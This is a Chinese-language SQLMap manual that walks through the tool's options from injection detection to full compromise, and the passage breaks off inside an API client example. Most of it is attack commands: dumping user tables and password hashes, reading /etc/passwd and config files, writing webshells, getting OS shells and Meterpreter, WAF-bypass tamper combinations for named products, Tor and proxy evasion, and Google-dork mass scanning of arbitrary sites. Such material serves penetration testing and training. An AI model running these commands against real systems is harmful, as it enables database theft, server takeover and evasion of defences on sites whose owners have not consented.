# SQLMap 完整使用手册

## 一、基础入门

### 1.1 SQLMap 概述
- **工具介绍与特性**
  - 开源的自动化 SQL 注入检测工具
  - 支持 6 种 SQL 注入技术
  - 强大的检测引擎和数据库接管功能
  - 跨平台支持（Windows/Linux/macOS）
  
- **支持的数据库类型**
  - MySQL, Oracle, PostgreSQL, Microsoft SQL Server
  - SQLite, Microsoft Access, Firebird
  - Sybase, SAP MaxDB, IBM DB2
  - HSQLDB, H2, Informix 等

- **工作原理与流程**
  1. 发送测试 payload 到目标参数
  2. 分析响应判断是否存在注入
  3. 识别数据库类型和版本
  4. 根据注入类型选择合适技术
  5. 执行数据枚举或系统命令

- **安装与环境配置**
  ```bash
  # Kali Linux 预装
  sqlmap -h
  
  # 其他系统安装
  git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
  cd sqlmap
  python sqlmap.py -h
  
  # Python 3 依赖
  pip3 install -r requirements.txt
  ```

### 1.2 SQL注入基础
- **SQL注入原理**
  - 用户输入未经过滤直接拼接到 SQL 语句
  - 攻击者构造恶意 SQL 代码改变查询逻辑
  - 可导致数据泄露、权限提升、系统控制

- **注入点类型分类**
  - GET 参数注入：URL 查询参数
  - POST 参数注入：表单提交数据
  - Cookie 注入：Cookie 字段
  - HTTP 头注入：User-Agent、Referer、X-Forwarded-For 等
  - JSON/XML 注入：API 请求体
  - 二阶注入：存储后触发的注入

- **手工注入与自动化对比**
  | 特性 | 手工注入 | SQLMap 自动化 |
  |------|----------|---------------|
  | 速度 | 慢 | 快 |
  | 准确性 | 依赖经验 | 高 |
  | 隐蔽性 | 较好 | 容易被 WAF 检测 |
  | 学习成本 | 高 | 低 |
  | 灵活性 | 高 | 中等 |

- **常见防护机制**
  - WAF（Web 应用防火墙）
  - 参数化查询/预编译语句
  - 输入验证与过滤
  - 最小权限原则
  - 错误信息隐藏

## 二、目标参数设置

### 2.1 目标URL参数
```bash
-u URL, --url=URL              # 目标URL（最常用）
                               # 示例: -u "http://example.com/page.php?id=1"

-d DIRECT                      # 直接连接数据库字符串
                               # 示例: -d "mysql://user:pass@host:3306/db"

-l LOGFILE                     # 从Burp或WebScarab日志解析目标
                               # 示例: -l burp.log

-m BULKFILE                    # 从文本文件获取批量目标（一行一个URL）
                               # 示例: -m targets.txt

-r REQUESTFILE                 # 从文件加载HTTP请求（推荐用于复杂请求）
                               # 示例: -r request.txt

-g GOOGLEDORK                  # 将Google dork结果作为目标
                               # 示例: -g "inurl:product.php?id="

-c CONFIGFILE                  # 从配置文件加载选项
                               # 示例: -c sqlmap.conf
```

### 2.2 请求参数
```bash
--method=METHOD                # HTTP方法(GET/POST/PUT/DELETE等)
--data=DATA                    # POST数据
                               # 示例: --data="username=admin&password=123"

--param-del=PARA               # 参数分隔符（默认&）
--cookie=COOKIE                # Cookie值
                               # 示例: --cookie="PHPSESSID=abc123; security=low"

--cookie-del=COO               # Cookie分隔符（默认;）
--load-cookies=L               # 从Netscape/Firefox格式文件加载cookies
--drop-set-cookie              # 忽略响应的Set-Cookie头

# POST 数据注入示例
--data="id=1&name=test"        # POST 参数注入
--data='{"id":1,"name":"test"}' # JSON 格式注入
```

### 2.3 HTTP头部设置
```bash
--user-agent=AGENT             # 自定义User-Agent
--random-agent                 # 使用随机User-Agent（推荐）
--host=HOST                    # 自定义Host头
--referer=REFERER              # 自定义Referer头
-H HEADER                      # 额外HTTP头
--headers=HEADERS              # 额外HTTP头(多行，用\n分隔)

# 示例
-H "X-Forwarded-For: 127.0.0.1"
--headers="Accept-Language: en\nX-Custom: value"
```

### 2.4 认证参数
```bash
--auth-type=AUTH               # HTTP认证类型(Basic, Digest, NTLM)
--auth-cred=AUTH               # 认证凭据 user:password
--auth-file=AUTH               # HTTP认证PEM证书/私钥文件

# 示例
--auth-type=Basic --auth-cred="admin:password123"
```

## 三、注入参数配置

### 3.1 注入点指定
```bash
-p TESTPARAMETER               # 指定可测试参数（逗号分隔）
                               # 示例: -p "id,name"

--skip=SKIP                    # 跳过指定参数测试
--skip-static                  # 跳过不是动态的参数
--param-exclude=               # 使用正则排除参数
--dbms=DBMS                    # 指定后端数据库类型（提高速度）
                               # 可选: MySQL, Oracle, PostgreSQL, MSSQL等

--dbms-cred=DBMS               # 数据库认证凭据 user:password
--os=OS                        # 指定操作系统（Windows/Linux）

# 示例：仅测试id参数，指定MySQL数据库
-p id --dbms=MySQL
```

### 3.2 注入技术选择
```bash
--technique=TECH               # 指定SQL注入技术（可组合）
  B: Boolean-based blind       # 布尔盲注（通过真假判断）
  E: Error-based               # 报错注入（利用数据库报错）
  U: Union query-based         # 联合查询注入（最快）
  S: Stacked queries           # 堆叠注入（多语句执行）
  T: Time-based blind          # 时间盲注（通过延时判断）
  Q: Inline queries            # 内联查询

# 示例
--technique=BEU                # 只使用布尔、报错、联合查询
--technique=T                  # 只使用时间盲注（最隐蔽但最慢）
```

### 3.3 注入配置优化
```bash
--time-sec=TIMESEC             # 时间盲注延时秒数（默认5秒）
--union-cols=UCOLS             # 联合查询列数范围
                               # 示例: --union-cols=1-20

--union-char=UCHAR             # 联合查询使用的字符（默认NULL）
--union-from=UFROM             # 联合查询FROM表名
                               # 示例: --union-from=users

--dns-domain=DNS               # DNS渗出攻击域名（需外部DNS日志）
--second-url=SEC               # 二阶注入结果页面URL
--second-req=SEC               # 从文件加载二阶注入请求

# 优化建议
--time-sec=3                   # 减少延时提高速度
--union-cols=5-15              # 限制列数范围
```

### 3.4 注入边界设置
```bash
--prefix=PREFIX                # 注入payload前缀
                               # 示例: --prefix="') "

--suffix=SUFFIX                # 注入payload后缀
                               # 示例: --suffix=" AND ('1'='1"

# 示例：闭合单引号
--prefix="' " --suffix=" --"
# 原始: id=1
# 注入: id=1' [PAYLOAD] --
```

## 四、检测参数设置

### 4.1 检测级别
```bash
--level=LEVEL                  # 测试级别(1-5，默认1)
  1: 默认级别，仅测试GET和POST参数
  2: 增加HTTP Cookie测试
  3: 增加HTTP User-Agent和Referer测试
  4: 测试更多HTTP头（如X-Forwarded-For）
  5: 测试HTTP Host头

# 示例
--level=3                      # 测试Cookie、UA、Referer
```

### 4.2 风险等级
```bash
--risk=RISK                    # 风险级别(1-3，默认1)
  1: 默认安全级别
  2: 增加基于时间的盲注测试
  3: 增加OR-based注入测试（可能导致数据修改）

# 警告：risk=3 可能影响数据库数据
--risk=2                       # 推荐使用
```

### 4.3 检测选项
```bash
--string=STRING                # 页面真值条件的匹配字符串
                               # 示例: --string="Welcome"

--not-string=NOT               # 页面假值条件的匹配字符串
--regexp=REGEXP                # 页面真值条件的正则表达式
--code=CODE                    # 页面真值条件的HTTP状态码
                               # 示例: --code=200

--text-only                    # 仅比较文本内容（忽略HTML标签）
--titles                       # 仅比较页面标题

# 动态内容检测
--smart                        # 启用智能检测（减少误报）
--mobile                       # 模拟移动设备
--page-rank                    # 使用Google页面排名
```

### 4.4 注入点标记
```bash
# 在URL或POST数据中使用星号(*)标记注入点
-u "http://example.com/page.php?id=1*"
--data="username=admin*&password=123"

# 这样可以精确指定测试位置
```

## 五、指纹识别与枚举

### 5.1 指纹识别
```bash
-f, --fingerprint              # 详细的数据库指纹识别
-a, --all                      # 获取所有可能的信息
-b, --banner                   # 获取数据库版本banner
--current-user                 # 获取当前数据库用户
--current-db                   # 获取当前数据库名
--hostname                     # 获取服务器主机名
--is-dba                       # 检测当前用户是否为DBA
--users                        # 枚举所有数据库用户
--passwords                    # 枚举用户密码哈希值
--privileges                   # 枚举用户权限
--roles                        # 枚举用户角色

# 完整信息收集示例
sqlmap -u "url" -f -b --current-user --current-db --is-dba
```

### 5.2 数据库枚举
```bash
--dbs                          # 枚举所有数据库
--tables                       # 枚举指定数据库的表
--columns                      # 枚举指定表的列
--schema                       # 枚举完整数据库架构
--count                        # 获取表中的数据条数
--dump                         # 导出表数据
--dump-all                     # 导出所有数据库的所有表
--search                       # 搜索列、表或数据库

-D DB                          # 指定数据库名
-T TBL                         # 指定表名
-C COL                         # 指定列名
-X EXCLUDE                     # 排除指定列
-U USER                        # 指定用户名

# 完整枚举流程示例
sqlmap -u "url" --dbs                    # 1.列出所有数据库
sqlmap -u "url" -D testdb --tables       # 2.列出testdb的所有表
sqlmap -u "url" -D testdb -T users --columns  # 3.列出users表的列
sqlmap -u "url" -D testdb -T users --dump     # 4.导出users表数据
sqlmap -u "url" -D testdb -T users -C username,password --dump  # 5.只导出指定列

# 搜索敏感信息
--search -C password           # 搜索包含password的列
--search -T user               # 搜索包含user的表
```

### 5.3 数据检索
```bash
--start=LIMITSTART             # 从第N条记录开始
--stop=LIMITSTOP               # 到第N条记录结束
--first=FIRSTCHAR              # 从第N个字符开始检索
--last=LASTCHAR                # 到第N个字符结束检索

# 示例：只获取前10条记录
--start=1 --stop=10

--sql-query=QUERY              # 执行自定义SQL语句
                               # 示例: --sql-query="SELECT version()"

--sql-shell                    # 进入交互式SQL Shell
--sql-file=SQLFILE             # 执行SQL文件中的语句

# SQL Shell 使用示例
sqlmap -u "url" --sql-shell
sql> SELECT @@version;
sql> SELECT * FROM users LIMIT 5;
```

### 5.4 数据导出选项
```bash
--dump-format=FORMAT           # 导出格式(CSV, HTML, SQLITE)
--dump-table                   # 导出整表（不需要列名）
--exclude-sysdbs               # 排除系统数据库
-C "col1,col2"                 # 指定要导出的列
--where="condition"            # 添加WHERE条件
                               # 示例: --where="id>100"

# 导出到CSV
sqlmap -u "url" -D db -T users --dump --dump-format=CSV
```

## 六、高级功能

### 6.1 文件系统访问
```bash
--file-read=RFILE              # 从服务器读取文件
                               # 示例: --file-read="/etc/passwd"
                               # 示例: --file-read="C:/windows/system.ini"

--file-write=WFILE             # 要写入的本地文件路径
--file-dest=DFILE              # 写入到服务器的目标路径
                               # 示例: --file-write="/tmp/shell.php" 
                               #       --file-dest="/var/www/html/shell.php"

# 读取配置文件
--file-read="/var/www/html/config.php"
--file-read="C:/inetpub/wwwroot/web.config"

# 写入 Webshell
--file-write="shell.php" --file-dest="/var/www/html/cmd.php"
```

### 6.2 操作系统访问
```bash
--os-cmd=OSCMD                 # 执行单条系统命令
                               # 示例: --os-cmd="whoami"

--os-shell                     # 获取交互式操作系统Shell
--os-pwn                       # 获取OOB Shell/Meterpreter/VNC
--os-smbrelay                  # 一键获取OOB Shell通过SMB中继
--os-bof                       # 缓冲区溢出利用

--priv-esc                     # 数据库进程权限提升
--msf-path=MSFPATH             # Metasploit Framework本地路径
--tmp-path=TMPPATH             # 远程临时文件目录

# 执行命令示例
sqlmap -u "url" --os-cmd="ipconfig"        # Windows
sqlmap -u "url" --os-cmd="cat /etc/passwd" # Linux

# 获取交互式Shell
sqlmap -u "url" --os-shell
os-shell> whoami
os-shell> cat /etc/passwd
```

### 6.3 Windows注册表操作
```bash
--reg-read                     # 读取注册表键值
--reg-add                      # 写入注册表键值
--reg-del                      # 删除注册表键值
--reg-key=REGKEY               # 注册表键路径
--reg-value=REGVAL             # 注册表值名称
--reg-data=REGDATA             # 注册表值数据
--reg-type=REGTYPE             # 注册表值类型

# 读取注册表示例
--reg-read --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" --reg-value="ProductName"

# 写入注册表示例
--reg-add --reg-key="HKLM\SOFTWARE\Test" --reg-value="TestValue" --reg-data="123" --reg-type="REG_SZ"
```

### 6.4 UDF注入（用户自定义函数）
```bash
--udf-inject                   # 注入用户自定义函数
--shared-lib=SHLIB             # 共享库本地路径

# MySQL UDF提权
sqlmap -u "url" --udf-inject --shared-lib="/path/to/lib_mysqludf_sys.so"
```

## 七、性能优化

### 7.1 优化选项
```bash
-o                             # 开启所有优化选项
--predict-output               # 预测常见查询输出
--keep-alive                   # 使用HTTP持久连接
--null-connection              # 只检索页面长度（无内容）
--threads=THREADS              # 最大并发HTTP请求数（默认1）
                               # 建议: --threads=5 （不要超过10）

# 最优性能组合
-o --threads=5
```

### 7.2 性能调优
```bash
--eta                          # 显示预计完成时间
--flush-session                # 刷新当前会话数据
--fresh-queries                # 忽略会话文件中的查询结果
--parse-errors                 # 从响应中解析并显示DBMS错误
--preprocess=PRE               # 使用指定脚本预处理响应
--postprocess=POS              # 使用指定脚本后处理响应
--repair                       # 修复损坏的会话文件
--cleanup                      # 清理DBMS中的SQLMap特定UDF和表

# 会话管理
-s SESSION.sqlite              # 指定会话文件
--flush-session                # 清除会话重新测试
```

### 7.3 速度优化建议
```bash
# 快速检测
--batch --random-agent --threads=5

# 针对已知数据库
--dbms=MySQL --threads=5

# 跳过不必要的测试
--technique=EU --threads=5

# 减少时间盲注延时
--time-sec=2 --threads=5
```

## 八、绕过与规避

### 8.1 绕过技术
```bash
--tamper=TAMPER                # 使用Tamper脚本绕过WAF/IPS
                               # 可以使用多个脚本（逗号分隔）
                               # 示例: --tamper=space2comment,between

--skip-waf                     # 跳过WAF/IPS启发式检测
--check-waf                    # 检测WAF/IPS保护
--identify-waf                 # 彻底识别WAF/IPS保护

# 常用组合
--tamper=space2comment --random-agent --delay=2
```

### 8.2 常用Tamper脚本详解
```bash
# 编码类
apostrophemask.py              # 单引号替换为UTF-8编码
                               # ' → %EF%BC%87

apostrophenullencode.py        # 单引号替换为%00%27
base64encode.py                # Base64编码所有字符
                               # SELECT → U0VMRUNUDQo=

charencode.py                  # URL编码非字母数字字符
charunicodeencode.py           # Unicode编码非编码字符
                               # SELECT → %u0053%u0045%u004C%u0045%u0043%u0054

# 替换类
between.py                     # 大于号替换为NOT BETWEEN
                               # '>' → 'NOT BETWEEN 0 AND #'

equaltolike.py                 # 等号替换为LIKE运算符
                               # = → LIKE

greatest.py                    # 大于号替换为GREATEST
                               # '>' → 'GREATEST'

# 空格处理
space2comment.py               # 空格替换为注释符
                               # ' ' → '/**/'

space2plus.py                  # 空格替换为加号
                               # ' ' → '+'

space2randomblank.py           # 空格替换为随机空白字符
                               # ' ' → %09, %0A, %0C, %0D, %0B等

space2hash.py                  # 空格替换为#号和随机字符串
                               # ' ' → '%23randomstr%0A'

space2morehash.py              # 空格替换为#号和更多随机字符
space2mssqlblank.py            # 空格替换为MSSQL有效空白字符
space2mssqlhash.py             # 空格替换为#号(MSSQL)
space2mysqlblank.py            # 空格替换为MySQL有效空白字符
space2mysqldash.py             # 空格替换为--号和换行符

# 关键字处理
randomcase.py                  # 随机大小写
                               # SELECT → SeLeCt

randomcomments.py              # 随机位置插入注释
                               # SELECT → S/**/E/**/LECT

versionedkeywords.py           # 关键字添加MySQL版本注释
                               # UNION → /*!12345UNION*/

halfversionedmorekeywords.py   # 部分关键字添加版本注释
varnish.py                     # 添加HTTP头X-Forwarded-For

# UNION处理
unionalltounion.py             # UNION ALL SELECT替换为UNION SELECT
unionselect.py                 # UNION SELECT替换为U/**/NION/**/SELECT

# 特定WAF绕过
modsecurityversioned.py        # 绕过ModSecurity
modsecurityzeroversioned.py    # 使用/*!00000*/绕过
securesphere.py                # 绕过SecureSphere WAF
versionedmorekeywords.py       # 使用MySQL版本注释

# 其他
percentage.py                  # 在每个字符前添加%号
multiplespaces.py              # 单个空格替换为多个空格
overlongutf8.py                # 转换为overlong UTF-8编码
overlongutf8more.py            # 更多overlong UTF-8编码
unmagicquotes.py               # 绕过magic_quotes（宽字节注入）
                               # ' → %bf%27

appendnullbyte.py              # 在payload末尾添加%00
chardoubleencode.py            # 双重URL编码
commalesslimit.py              # 绕过LIMIT N,M限制
commalessmid.py                # 绕过MID(column,start,length)限制
concat2concatws.py             # CONCAT()替换为CONCAT_WS()
hex2char.py                    # 十六进制转字符
htmlencode.py                  # HTML编码所有非字母数字字符
ifnull2casewhenisnull.py       # IFNULL(A, B)替换为CASE WHEN ISNULL(A)
ifnull2ifisnull.py             # IFNULL(A,B)替换为IF(ISNULL(A),B,A)
luanginx.py                    # 绕过LUA-Nginx WAF
lowercase.py                   # 全部转换为小写
misunion.py                    # UNION替换为-1'||'0-（针对Microsoft SQL）
```

### 8.3 匿名与代理
```bash
# 代理设置
--proxy=PROXY                  # 使用代理服务器
                               # 示例: --proxy="http://127.0.0.1:8080"
                               # 示例: --proxy="socks5://127.0.0.1:1080"

--proxy-cred=PROXY             # 代理认证凭据 user:pass
--proxy-file=PRO               # 从文件加载代理列表（随机使用）

# Tor网络
--tor                          # 使用Tor匿名网络
--tor-port=TORPORT             # Tor代理端口（默认9050）
--tor-type=TORTYPE             # Tor代理类型（HTTP, SOCKS4, SOCKS5）
--check-tor                    # 检查Tor是否正确配置

# 请求控制
--delay=DELAY                  # 每个HTTP请求之间的延时（秒）
                               # 示例: --delay=2 （每次请求间隔2秒）

--timeout=TIMEOUT              # 连接超时秒数（默认30）
--retries=RETRIES              # HTTP请求重试次数（默认3）
--randomize=RPARAM             # 随机改变指定参数值
                               # 示例: --randomize=id

# 安全URL
--safe-url=SAFEURL             # 测试时频繁访问的安全URL
--safe-post=SAFE               # 发送到安全URL的POST数据
--safe-req=SAFER               # 从文件加载安全HTTP请求
--safe-freq=SAFE               # 每访问X次目标后访问一次安全URL

# 示例：每5次请求访问一次安全页面
--safe-url="http://example.com/safe.php" --safe-freq=5

# 其他规避选项
--skip-urlencode               # 跳过payload的URL编码
--csrf-token=CSR               # 参数用于存放CSRF token
--csrf-url=CSRFURL             # 提取CSRF token的URL
--csrf-method=METHOD           # 访问CSRF token URL的方法
--force-ssl                    # 强制使用SSL/HTTPS
--chunked                      # 使用HTTP分块传输编码
--hpp                          # 使用HTTP参数污染
                               # 示例: id=1&id=[PAYLOAD]

--eval=EVALCODE                # 在请求前执行Python代码
                               # 示例: --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"

# 完整规避组合示例
--proxy="http://127.0.0.1:8080" --random-agent --delay=3 --tamper=space2comment,randomcase
```

### 8.4 WAF识别与绕过流程
```bash
# 1. 识别WAF
sqlmap -u "url" --identify-waf

# 2. 根据WAF选择Tamper
# Cloudflare
--tamper=space2comment

# ModSecurity
--tamper=modsecurityversioned,space2comment

# 安全狗
--tamper=space2comment,between,randomcase

# 阿里云盾
--tamper=space2morehash,between

# 3. 完整绕过测试
sqlmap -u "url" --random-agent --tamper=space2comment,between --delay=2 --risk=2 --level=3
```

## 九、输出与报告

### 9.1 输出控制
```bash
-v VERBOSE                     # 详细级别(0-6)
  0: 只显示Python错误和严重信息
  1: 显示基本信息和警告（默认）
  2: 显示调试信息
  3: 显示注入的payload
  4: 显示HTTP请求
  5: 显示HTTP响应头
  6: 显示HTTP响应体

# 示例
-v 3                           # 查看具体的注入payload
-v 4                           # 调试HTTP请求问题
```

### 9.2 输出格式
```bash
--batch                        # 批处理模式（不需要用户交互）
--binary-fields=B              # 包含二进制数据的字段（逗号分隔）
--charset=CHARSET              # 强制字符编码（如GBK, UTF-8）
--crawl=CRAWLDEPTH             # 从目标URL开始爬取网站深度
                               # 示例: --crawl=2

--crawl-exclude=              # 爬取时排除的正则表达式
--csv-del=CSVDEL               # CSV输出文件的分隔符（默认逗号）
--dump-format=DU               # 导出数据格式（CSV, HTML, SQLITE）
--encoding=ENCOD               # 用于数据检索的字符编码
--output-dir=OUT               # 自定义输出目录路径
                               # 默认: ~/.local/share/sqlmap/output

--save=SAVECONFIG              # 保存选项到配置文件
                               # 示例: --save=config.conf

--scope=SCOPE                  # 使用正则过滤目标范围
                               # 示例: --scope="(www\.)?target\.com"

# 实用示例
--batch --crawl=3 --output-dir=/tmp/sqlmap_results
```

### 9.3 日志记录
```bash
-s SESSIONFILE                 # 存储会话的SQLite文件
                               # 示例: -s session.sqlite

-t TRAFFICFILE                 # 记录所有HTTP流量到文本文件
                               # 示例: -t traffic.txt

--answers=ANSWERS              # 预设问题答案（用于批处理）
                               # 示例: --answers="quit=N,follow=Y"

--beep                         # 发现SQL注入时发出蜂鸣声
--dependencies                 # 检查SQLMap依赖项是否安装
--disable-coloring             # 禁用彩色输出
--list-tampers                 # 列出所有可用的tamper脚本
--no-logging                   # 禁用日志记录
--offline                      # 离线模式（仅使用会话数据）
--purge                        # 安全删除output目录中的所有内容
--results-file=R               # CSV格式的多目标结果文件
--shell                        # 提示进入交互式shell
--tmp-dir=TMPDIR               # 存储临时文件的本地目录
--unstable                     # 调整不稳定连接的选项
--update                       # 更新SQLMap到最新版本
--wizard                       # 简单向导界面（适合新手）

# 完整日志记录示例
-v 4 -t traffic.txt -s session.sqlite --batch
```

### 9.4 报告生成
```bash
# 导出HTML格式报告
sqlmap -u "url" -D database -T table --dump --dump-format=HTML

# 导出CSV格式（便于Excel分析）
sqlmap -u "url" -D database -T table --dump --dump-format=CSV --csv-del=";"

# 生成SQLite数据库
sqlmap -u "url" -D database -T table --dump --dump-format=SQLITE

# 输出目录结构
# ~/.local/share/sqlmap/output/
# └── target.com/
#     ├── dump/           # 导出的数据
#     ├── files/          # 读取的文件
#     ├── log             # 日志文件
#     └── session.sqlite  # 会话数据
```

## 十、实战案例与技巧

### 10.1 常用命令组合

#### 基础检测
```bash
# 快速检测（最常用）
sqlmap -u "http://example.com/page.php?id=1" --batch --random-agent

# 带Cookie的检测
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abc123" --level=2 --batch

# POST参数检测
sqlmap -u "http://example.com/login.php" --data="username=admin&password=123" --batch

# 从Burp Suite请求文件检测（推荐）
sqlmap -r request.txt --batch --random-agent
```

#### 深度检测
```bash
# 完整深度扫描
sqlmap -u "url" --level=5 --risk=3 --batch --random-agent

# 测试所有参数（包括Cookie、UA等）
sqlmap -u "url" --cookie="session=xxx" --level=5 --risk=2 --batch

# 指定数据库类型加速
sqlmap -u "url" --dbms=MySQL --level=3 --risk=2 --batch
```

#### WAF绕过
```bash
# 基础绕过
sqlmap -u "url" --tamper=space2comment --random-agent --delay=2

# 多重绕过技术
sqlmap -u "url" --tamper=space2comment,between,randomcase --random-agent --delay=3 --batch

# 完整规避方案
sqlmap -u "url" \
  --tamper=space2comment,between \
  --random-agent \
  --delay=2 \
  --proxy="http://127.0.0.1:8080" \
  --hpp \
  --batch
```

#### 数据获取
```bash
# 完整数据获取流程
# 1. 获取所有数据库
sqlmap -u "url" --dbs --batch

# 2. 获取指定数据库的所有表
sqlmap -u "url" -D testdb --tables --batch

# 3. 获取指定表的所有列
sqlmap -u "url" -D testdb -T users --columns --batch

# 4. 导出指定表的数据
sqlmap -u "url" -D testdb -T users --dump --batch

# 5. 只导出特定列
sqlmap -u "url" -D testdb -T users -C "username,password,email" --dump --batch

# 6. 条件导出
sqlmap -u "url" -D testdb -T users --dump --where="id>100" --batch

# 7. 限制导出数量
sqlmap -u "url" -D testdb -T users --dump --start=1 --stop=100 --batch
```

#### 系统命令执行
```bash
# 执行单条命令
sqlmap -u "url" --os-cmd="whoami" --batch

# 获取交互式Shell
sqlmap -u "url" --os-shell --batch

# 读取敏感文件
sqlmap -u "url" --file-read="/etc/passwd" --batch
sqlmap -u "url" --file-read="C:/windows/system32/drivers/etc/hosts" --batch

# 写入WebShell
sqlmap -u "url" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

#### POST注入
```bash
# 简单POST注入
sqlmap -u "http://example.com/login.php" \
  --data="username=admin&password=123" \
  --batch

# JSON格式POST注入
sqlmap -u "http://example.com/api/login" \
  --data='{"username":"admin","password":"123"}' \
  --batch

# XML格式POST注入
sqlmap -u "http://example.com/api" \
  --data='<?xml version="1.0"?><user><id>1</id></user>' \
  --batch

# 标记具体注入点
sqlmap -u "http://example.com/login.php" \
  --data="username=admin*&password=123" \
  --batch
```

#### Cookie注入
```bash
# Cookie参数注入
sqlmap -u "http://example.com/page.php" \
  --cookie="id=1; security=low" \
  --level=2 \
  --batch

# 标记Cookie注入点
sqlmap -u "http://example.com/page.php" \
  --cookie="id=1*; security=low" \
  --batch

# 从文件加载Cookie
sqlmap -u "http://example.com/page.php" \
  --load-cookies=cookies.txt \
  --level=2 \
  --batch
```

#### 批量检测
```bash
# 从文件读取多个URL
sqlmap -m targets.txt --batch --random-agent

# targets.txt 内容示例:
# http://example.com/page.php?id=1
# http://test.com/product.php?pid=2
# http://demo.com/user.php?uid=3

# Google Dork批量检测
sqlmap -g "inurl:product.php?id=" --batch --random-agent

# 从Burp日志批量检测
sqlmap -l burp.log --batch --random-agent
```

#### 二阶注入
```bash
# 二阶注入检测
sqlmap -r first.txt \
  --second-req=second.txt \
  --batch

# 或指定二阶URL
sqlmap -r first.txt \
  --second-url="http://example.com/result.php" \
  --batch
```

### 10.2 故障排查

#### 常见错误与解决方案
```bash
# 错误1: 连接超时
# 解决: 增加超时时间和重试次数
--timeout=60 --retries=5

# 错误2: WAF拦截
# 解决: 使用tamper和延时
--tamper=space2comment --delay=3 --random-agent

# 错误3: 无法识别注入点
# 解决: 提高检测级别，手动标记注入点
--level=5 --risk=3
# 或使用 * 标记: -u "url?id=1*"

# 错误4: 会话数据损坏
# 解决: 清除会话重新测试
--flush-session

# 错误5: 编码问题导致乱码
# 解决: 指定正确的字符编码
--charset=GBK
--encoding=UTF-8

# 错误6: 目标不稳定
# 解决: 使用不稳定连接选项
--unstable --delay=2

# 错误7: SSL证书错误
# 解决: 强制SSL但忽略证书验证
--force-ssl

# 错误8: 代理连接失败
# 解决: 检查代理设置
--check-proxy
--proxy="http://127.0.0.1:8080"
```

#### 性能问题优化
```bash
# 问题1: 检测速度太慢
# 解决方案:
# 1) 指定数据库类型
--dbms=MySQL

# 2) 减少测试技术
--technique=EU

# 3) 增加线程数
--threads=5

# 4) 使用优化选项
-o

# 5) 跳过静态参数
--skip-static

# 综合优化:
sqlmap -u "url" --dbms=MySQL --technique=EU -o --threads=5 --batch

# 问题2: 时间盲注太慢
# 解决方案:
# 1) 减少延时秒数
--time-sec=2

# 2) 使用二分法
--code=200 --string="success"

# 3) 避免使用时间盲注
--technique=BEU
```

#### 绕过检测技巧
```bash
# 技巧1: 绕过参数名过滤
# 如果过滤了 "id" 参数，使用其他参数
-p "pid,uid,cid"

# 技巧2: 绕过关键字过滤
# 使用tamper脚本混淆
--tamper=randomcase,space2comment,between

# 技巧3: 绕过长度限制
# 使用最短的payload
--technique=B

# 技巧4: 绕过频率限制
# 添加请求延时
--delay=5 --safe-url="http://example.com/" --safe-freq=3

# 技巧5: 绕过IP封禁
# 使用代理池
--proxy-file=proxies.txt --random-agent

# 技巧6: 绕过User-Agent检测
# 使用真实浏览器UA或随机UA
--user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

#### 手动验证方法
```bash
# 1. 布尔盲注验证
# 原始: http://example.com/page.php?id=1
# 测试: http://example.com/page.php?id=1 AND 1=1  (正常)
# 测试: http://example.com/page.php?id=1 AND 1=2  (异常)

# 2. 联合查询验证
# 判断列数: ?id=1 ORDER BY 1,2,3...
# 联合查询: ?id=-1 UNION SELECT 1,2,3,4

# 3. 报错注入验证
# ?id=1 AND updatexml(1,concat(0x7e,version()),1)

# 4. 时间盲注验证
# ?id=1 AND SLEEP(5)

# 使用SQLMap验证手工发现的注入
sqlmap -u "url" --technique=B --string="成功"
```

## 十一、扩展与进阶

### 11.1 自定义开发

#### Tamper脚本编写
```python
#!/usr/bin/env python
# custom_tamper.py - 自定义Tamper脚本模板

"""
Copyright (c) 2006-2024 sqlmap developers
See the file 'LICENSE' for copying permission

说明: 将空格替换为制表符
示例: SELECT * FROM users
      SELECT%09*%09FROM%09users
"""

from lib.core.enums import PRIORITY

# 脚本优先级
__priority__ = PRIORITY.NORMAL

def dependencies():
    """
    声明依赖项（可选）
    """
    pass

def tamper(payload, **kwargs):
    """
    主要的Tamper函数
    
    参数:
        payload: 原始payload字符串
    
    返回:
        修改后的payload字符串
    """
    if payload:
        # 将空格替换为制表符(%09)
        payload = payload.replace(' ', '%09')
    
    return payload

# 测试代码
if __name__ == '__main__':
    # 测试tamper函数
    test_payload = "SELECT * FROM users WHERE id=1"
    print("原始:", test_payload)
    print("修改:", tamper(test_payload))
```

#### 更多Tamper示例
```python
# 示例1: 关键字大小写混淆
def tamper(payload, **kwargs):
    if payload:
        import random
        result = ""
        for char in payload:
            if char.isalpha():
                result += char.upper() if random.randint(0, 1) else char.lower()
            else:
                result += char
        return result
    return payload

# 示例2: 注释符混淆
def tamper(payload, **kwargs):
    comments = ['/**/', '/*test*/', '/*!50000*/']
    if payload:
        import random
        words = payload.split(' ')
        return random.choice(comments).join(words)
    return payload

# 示例3: 编码混合
def tamper(payload, **kwargs):
    if payload:
        result = ""
        for char in payload:
            if char == ' ':
                result += '%09'  # Tab
            elif char == '=':
                result += '%3D'  # URL编码
            else:
                result += char
        return result
    return payload

# 使用自定义Tamper
sqlmap -u "url" --tamper=/path/to/custom_tamper.py
```

#### 插件开发
```python
# sqlmap/plugins/generic/custom.py
# 自定义SQLMap插件示例

from lib.core.common import Backend
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger

class CustomPlugin:
    """
    自定义插件类
    """
    
    def __init__(self):
        pass
    
    def checkDbms(self):
        """
        检测数据库类型
        """
        infoMsg = "正在执行自定义检测..."
        logger.info(infoMsg)
        
        # 自定义检测逻辑
        return False
    
    def getFingerprint(self):
        """
        获取数据库指纹
        """
        return "Custom Database Fingerprint"
    
    def customAction(self):
        """
        自定义操作
        """
        logger.info("执行自定义操作")
        # 实现具体逻辑
        pass
```

#### API接口使用
```python
#!/usr/bin/env python
# sqlmap_api_client.py - SQLMap API客户端示例

import requests
import json
import time

class SQLMapAPI:
    def __init__(self, host='127.0.0.1', port=8775):
        self.base_url = f"http://{host}:{port}"
        self.task_id = None
    
    def create_task(self):
        """创建新任务"""
        url = f"{self.base_url}/task/new"
        response = requests.get(url)
        self.task_id = response.json()['taskid']
        print(f"任务ID: {self.task_id}")
        return self.task_id
    
    def start_scan(self, target_url):
        """开始扫描"""
        url = f"{self.base_url}/scan/{self.task_id}/start"
        data = {
